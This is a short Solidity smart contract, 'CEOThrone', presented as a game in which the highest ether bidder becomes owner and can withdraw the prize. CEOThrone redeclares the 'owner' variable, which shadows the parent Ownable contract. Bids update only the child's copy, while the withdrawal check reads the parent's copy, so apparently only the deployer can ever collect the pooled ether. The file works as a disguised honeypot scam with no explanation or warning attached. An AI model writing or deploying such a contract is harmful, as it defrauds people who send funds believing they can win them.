pragma solidity ^0.4.19;


contract Ownable {
    address public owner;
    function Ownable() public {owner = msg.sender;}
    modifier onlyOwner() {require(msg.sender == owner); _;
    }
}


contract CEOThrone is Ownable {
    address public owner;
    uint public largestCommitment;


    function CommitPower() public payable {

        if (msg.value > largestCommitment) {
            owner = msg.sender;
            largestCommitment = msg.value;
        }
    }

    function obtainPrize() public onlyOwner {

        msg.sender.transfer(this.balance);
    }
}